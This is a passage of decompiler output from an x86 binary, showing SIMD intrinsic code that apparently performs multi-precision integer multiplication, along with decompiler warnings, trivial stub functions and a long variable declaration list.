  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v271);
  v208 = _mm_mul_epu32(_mm_load_si128(&v261), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_46C990);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_4135F7();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v271);
  v226 = _mm_mul_epu32(_mm_load_si128(&v262), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_46C990);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_413634((int)&v262, &v271);
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v272);
  v242 = _mm_mul_epu32(_mm_load_si128(&v262), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_46C990);
  v246 = _mm_and_si128(v245, v242);
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  v250 = _mm_move_epi64(v248);
  v251 = _mm_move_epi64(v249);
  v252 = _mm_add_epi32(
           _mm_add_epi32(v240, v246),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v250), v250), 4));
  v253 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v251), v251), 4));
  *(_DWORD *)(v237 + 112) = _mm_cvtsi128_si32(v252);
  v254 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v252), 0x10u), _mm_move_epi64(v253));
  *(_QWORD *)(v237 + 114) = v254.m128i_i64[0];
  *(_QWORD *)(v237 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v252, v250), _mm_srli_epi64(v254, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v253, v250), 0x10u)).m128i_u64[0];
}
// 413736: variable 'v33' is possibly undefined
// 41376D: variable 'v39' is possibly undefined
// 4137C6: variable 'v50' is possibly undefined
// 4137ED: variable 'v54' is possibly undefined
// 413859: variable 'v67' is possibly undefined
// 413890: variable 'v73' is possibly undefined
// 4138E9: variable 'v84' is possibly undefined
// 413910: variable 'v88' is possibly undefined
// 41397C: variable 'v101' is possibly undefined
// 4139B3: variable 'v107' is possibly undefined
// 413A0C: variable 'v118' is possibly undefined
// 413A33: variable 'v122' is possibly undefined
// 413A9F: variable 'v135' is possibly undefined
// 413AD6: variable 'v141' is possibly undefined
// 413B2F: variable 'v152' is possibly undefined
// 413B56: variable 'v156' is possibly undefined
// 413BC2: variable 'v169' is possibly undefined
// 413BF9: variable 'v175' is possibly undefined
// 413C52: variable 'v186' is possibly undefined
// 413C79: variable 'v190' is possibly undefined
// 413CE5: variable 'v203' is possibly undefined
// 413D1C: variable 'v209' is possibly undefined
// 413D75: variable 'v220' is possibly undefined
// 413D9C: variable 'v224' is possibly undefined
// 413E08: variable 'v237' is possibly undefined
// 413E3D: variable 'v243' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 413409: using guessed type __m128i anonymous_11;

//----- (004134C6) --------------------------------------------------------
int sub_4134C6()
{
  return sub_413503();
}
// 413503: using guessed type int sub_413503(void);

//----- (00413503) --------------------------------------------------------
int sub_413503()
{
  return sub_413540();
}
// 413540: using guessed type int sub_413540(void);

//----- (00413540) --------------------------------------------------------
int sub_413540()
{
  return sub_41357D();
}
// 41357D: using guessed type int sub_41357D(void);

//----- (0041357D) --------------------------------------------------------
int sub_41357D()
{
  return sub_4135BA();
}
// 4135BA: using guessed type int sub_4135BA(void);

//----- (004135BA) --------------------------------------------------------
int sub_4135BA()
{
  return sub_4135F7();
}
// 4135F7: using guessed type int sub_4135F7(void);

//----- (004135F7) --------------------------------------------------------
int sub_4135F7()
{
  return sub_413634();
}
// 413634: using guessed type int sub_413634(void);

//----- (00413634) --------------------------------------------------------
__m128i __usercall sub_413634@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00413EC9) --------------------------------------------------------
void __cdecl sub_413EC9(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm4
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  __m128i v250; // xmm0
  __m128i v251; // xmm1
  __m128i v252; // xmm4
  __m128i v253; // xmm5
  int v254; // ecx
  __m128i v255; // xmm6
  __m128i v256; // xmm5
  __m128i v257; // xmm4
  __m128i *v258; // edx
  __m128i v259; // xmm7
  __m128i v260; // xmm0
  __m128i v261; // xmm7
  __m128i v262; // xmm6
  __m128i v263; // xmm4
  __m128i v264; // xmm5
  __m128i v265; // xmm6
  __m128i v266; // xmm7
  __m128i v267; // xmm0
  __m128i v268; // xmm1
  __m128i v269; // xmm4
  __m128i v270; // xmm5
  int v271; // ecx
  __m128i v272; // xmm6
  __m128i v273; // xmm5
  __m128i v274; // xmm4
  __m128i v275; // xmm7
  __m128i v276; // xmm0
  __m128i *v277; // edx
  __m128i v278; // xmm7
  __m128i v279; // xmm6
  __m128i v280; // xmm4
  __m128i v281; // xmm5
  __m128i v282; // xmm6
  __m128i v283; // xmm7
  __m128i v284; // xmm0
  __m128i v285; // xmm1
  __m128i v286; // xmm4
  __m128i v287; // xmm5
  int v288; // ecx
  __m128i v289; // xmm6
  __m128i v290; // xmm5
  __m128i v291; // xmm4
  __m128i *v292; // edx
  __m128i v293; // xmm7
  __m128i v294; // xmm0
  __m128i v295; // xmm7
  __m128i v296; // xmm6
  __m128i v297; // xmm4
  __m128i v298; // xmm5
  __m128i v299; // xmm6
  __m128i v300; // xmm7
  __m128i v301; // xmm0
  __m128i v302; // xmm1
  __m128i v303; // xmm4
  __m128i v304; // xmm5
  int v305; // ecx
  __m128i v306; // xmm6
  __m128i v307; // xmm5
  __m128i v308; // xmm4
  __m128i v309; // xmm7
  __m128i v310; // xmm0
  __m128i *v311; // edx
  __m128i v312; // xmm7
  __m128i v313; // xmm6
  __m128i v314; // xmm4
  __m128i v315; // xmm5
  __m128i v316; // xmm6
  __m128i v317; // xmm7
  __m128i v318; // xmm0
  __m128i v319; // xmm1
  __m128i v320; // xmm4
  __m128i v321; // xmm5
  int v322; // ecx
  __m128i v323; // xmm6
  __m128i v324; // xmm5
  __m128i v325; // xmm4
  __m128i *v326; // edx
  __m128i v327; // xmm7
  __m128i v328; // xmm0
  __m128i v329; // xmm7
  __m128i v330; // xmm6
  __m128i v331; // xmm4
  __m128i v332; // xmm5
  __m128i v333; // xmm6
  __m128i v334; // xmm7
  __m128i v335; // xmm0
  __m128i v336; // xmm1
  __m128i v337; // xmm4
  __m128i v338; // xmm5
  int v339; // ecx
  __m128i v340; // xmm6
  __m128i v341; // xmm5
  __m128i v342; // xmm4
  __m128i v343; // xmm7
  __m128i v344; // xmm0
  __m128i *v345; // edx
  __m128i v346; // xmm7
  __m128i v347; // xmm6
  __m128i v348; // xmm4
  __m128i v349; // xmm5
  __m128i v350; // xmm6
  __m128i v351; // xmm7
  __m128i v352; // xmm0
  __m128i v353; // xmm1
  __m128i v354; // xmm4
  __m128i v355; // xmm5
  int v356; // ecx
  __m128i v357; // xmm6
  __m128i v358; // xmm5
  __m128i v359; // xmm4
  __m128i *v360; // edx
  __m128i v361; // xmm7
  __m128i v362; // xmm0
  __m128i v363; // xmm7
  __m128i v364; // xmm6
  __m128i v365; // xmm4
  __m128i v366; // xmm5
  __m128i v367; // xmm6
  __m128i v368; // xmm7
  __m128i v369; // xmm0
  __m128i v370; // xmm1
  __m128i v371; // xmm4
  __m128i v372; // xmm5
  int v373; // ecx
  __m128i v374; // xmm6
  __m128i v375; // xmm5
  __m128i v376; // xmm4
  __m128i v377; // xmm7
  __m128i v378; // xmm0
  __m128i *v379; // edx
  __m128i v380; // xmm7
  __m128i v381; // xmm6
  __m128i v382; // xmm4
  __m128i v383; // xmm5
  __m128i v384; // xmm6
  __m128i v385; // xmm7
  __m128i v386; // xmm0
  __m128i v387; // xmm1
  __m128i v388; // xmm4
  __m128i v389; // xmm5
  int v390; // ecx
  __m128i v391; // xmm6
  __m128i v392; // xmm5
  __m128i v393; // xmm4
  __m128i *v394; // edx
  __m128i v395; // xmm7
  __m128i v396; // xmm0
  __m128i v397; // xmm7
  __m128i v398; // xmm6
  __m128i v399; // xmm4
  __m128i v400; // xmm5
  __m128i v401; // xmm6
  __m128i v402; // xmm7
  __m128i v403; // xmm0
  __m128i v404; // xmm1
  __m128i v405; // xmm4
  __m128i v406; // xmm5
  int v407; // ecx
  __m128i v408; // xmm6
  __m128i v409; // xmm5
  __m128i v410; // xmm4
  __m128i v411; // xmm7
  __m128i v412; // xmm0
  __m128i *v413; // edx
  __m128i v414; // xmm7
  __m128i v415; // xmm6
  __m128i v416; // xmm4
  __m128i v417; // xmm5
  __m128i v418; // xmm6
  __m128i v419; // xmm7
  __m128i v420; // xmm0
  __m128i v421; // xmm1
  __m128i v422; // xmm4
  __m128i v423; // xmm5
  int v424; // ecx
  __m128i v425; // xmm6
  __m128i v426; // xmm5
  __m128i v427; // xmm4
  __m128i *v428; // edx
  __m128i v429; // xmm7
  __m128i v430; // xmm0
  __m128i v431; // xmm7
  __m128i v432; // xmm6
  __m128i v433; // xmm4
  __m128i v434; // xmm5
  __m128i v435; // xmm6
  __m128i v436; // xmm7
  __m128i v437; // xmm0
  __m128i v438; // xmm1
  __m128i v439; // xmm4
  __m128i v440; // xmm5
  int v441; // ecx
  __m128i v442; // xmm6
  __m128i v443; // xmm5
  __m128i v444; // xmm4
  __m128i v445; // xmm7
  __m128i v446; // xmm0
  __m128i *v447; // edx
  __m128i v448; // xmm7
  __m128i v449; // xmm6
  __m128i v450; // xmm4
  __m128i v451; // xmm5
  __m128i v452; // xmm6
  __m128i v453; // xmm7
  __m128i v454; // xmm0
  __m128i v455; // xmm1
  __m128i v456; // xmm4
  __m128i v457; // xmm5
  int v458; // ecx
  __m128i v459; // xmm6
  __m128i v460; // xmm5
  __m128i v461; // xmm4
  __m128i *v462; // edx
  __m128i v463; // xmm7
  __m128i v464; // xmm0
  __m128i v465; // xmm7
  __m128i v466; // xmm6
  __m128i v467; // xmm4
  __m128i v468; // xmm5
  __m128i v469; // xmm6
  __m128i v470; // xmm7
  __m128i v471; // xmm0
  __m128i v472; // xmm1
  __m128i v473; // xmm4
  __m128i v474; // xmm5
  int v475; // ecx
  __m128i v476; // xmm6
  __m128i v477; // xmm5
  __m128i v478; // xmm4
  __m128i v479; // xmm7
  __m128i v480; // xmm0
  __m128i *v481; // edx
  __m128i v482; // xmm7
  __m128i v483; // xmm6
  __m128i v484; // xmm4
  __m128i v485; // xmm5
  __m128i v486; // xmm6
  __m128i v487; // xmm7
  __m128i v488; // xmm0
  __m128i v489; // xmm1
  __m128i v490; // xmm4
  __m128i v491; // xmm5
  int v492; // ecx
  __m128i v493; // xmm6
  __m128i v494; // xmm5
  __m128i v495; // xmm4
  __m128i *v496; // edx
  __m128i v497; // xmm7
  __m128i v498; // xmm0
  __m128i v499; // xmm7
  __m128i v500; // xmm6
  __m128i v501; // xmm4
  __m128i v502; // xmm5
  __m128i v503; // xmm6
  __m128i v504; // xmm7
  __m128i v505; // xmm0
  __m128i v506; // xmm1
  __m128i v507; // xmm4
  __m128i v508; // xmm5
  int v509; // ecx
  __m128i v510; // xmm6
  __m128i v511; // xmm5
  __m128i v512; // xmm4
  __m128i v513; // xmm7
  __m128i v514; // xmm0
  __m128i *v515; // edx
  __m128i v516; // xmm7
  __m128i v517; // xmm6
  __m128i v518; // xmm2
  __m128i v519; // xmm5
  __m128i v520; // xmm6
  __m128i v521; // xmm7
  __m128i v522; // xmm0
  __m128i v523; // xmm1
  __m128i v524; // xmm4
  __m128i v525; // xmm5
  __m128i v526; // xmm6
  __m128i v527; // [esp+10h] [ebp-30Ch] BYREF
  __m128i v528; // [esp+20h] [ebp-2FCh] BYREF
  __m128i v529; // [esp+30h] [ebp-2ECh] BYREF
  __m128i v530; // [esp+40h] [ebp-2DCh] BYREF
  __m128i v531; // [esp+50h] [ebp-2CCh] BYREF
  __m128i v532; // [esp+60h] [ebp-2BCh] BYREF
  __m128i v533; // [esp+70h] [ebp-2ACh] BYREF
  __m128i v534; // [esp+80h] [ebp-29Ch] BYREF
  __m128i v535; // [esp+90h] [ebp-28Ch] BYREF
  __m128i v536; // [esp+A0h] [ebp-27Ch] BYREF
  __m128i v537; // [esp+B0h] [ebp-26Ch] BYREF
  __m128i v538; // [esp+C0h] [ebp-25Ch] BYREF
  __m128i v539; // [esp+D0h] [ebp-24Ch] BYREF
  __m128i v540; // [esp+E0h] [ebp-23Ch] BYREF
  __m128i v541; // [esp+F0h] [ebp-22Ch] BYREF
  __m128i v542; // [esp+100h] [ebp-21Ch] BYREF
  __m128i v543; // [esp+110h] [ebp-20Ch]
  __m128i v544[15]; // [esp+120h] [ebp-1FCh]
  __m128i v545; // [esp+210h] [ebp-10Ch] BYREF
  __m128i v546; // [esp+220h] [ebp-FCh] BYREF
  __m128i v547; // [esp+230h] [ebp-ECh] BYREF
  __m128i v548; // [esp+240h] [ebp-DCh] BYREF
  __m128i v549; // [esp+250h] [ebp-CCh] BYREF
  __m128i v550; // [esp+260h] [ebp-BCh] BYREF
  __m128i v551; // [esp+270h] [ebp-ACh] BYREF
  __m128i v552; // [esp+280h] [ebp-9Ch] BYREF
  __m128i v553; // [esp+290h] [ebp-8Ch] BYREF
  __m128i v554; // [esp+2A0h] [ebp-7Ch] BYREF
  __m128i v555; // [esp+2B0h] [ebp-6Ch] BYREF
  __m128i v556; // [esp+2C0h] [ebp-5Ch] BYREF
  __m128i v557; // [esp+2D0h] [ebp-4Ch] BYREF
  __m128i v558; // [esp+2E0h] [ebp-3Ch] BYREF
  __m128i v559; // [esp+2F0h] [ebp-2Ch] BYREF
  __m128i v560; // [esp+300h] [ebp-1Ch] BYREF

  for ( i = 0; i != 128; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v527 + 2 * i) = v4;
    *(__m128i *)((char *)&v528 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v543 + 2 * i) = v5;
    v544[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v545 + 2 * i) = v6;
    *(__m128i *)((char *)&v546 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v545);
  v8 = _mm_mul_epu32(_mm_load_si128(&v527), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v543);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v545);
  v22 = _mm_mul_epu32(_mm_load_si128(&v528), v21);
  v23 = _mm_mul_epu32(v21, v544[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_4142E2((int)&v528, &v545);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v546);
  v38 = _mm_mul_epu32(_mm_load_si128(&v528), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_4142A5();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v546);
  v56 = _mm_mul_epu32(_mm_load_si128(&v529), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_46C990);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_414268();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v547);
  v72 = _mm_mul_epu32(_mm_load_si128(&v529), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_46C990);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_41422B();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v547);
  v90 = _mm_mul_epu32(_mm_load_si128(&v530), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_46C990);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_4141EE();
  v97 = _mm_move_epi64(v95);
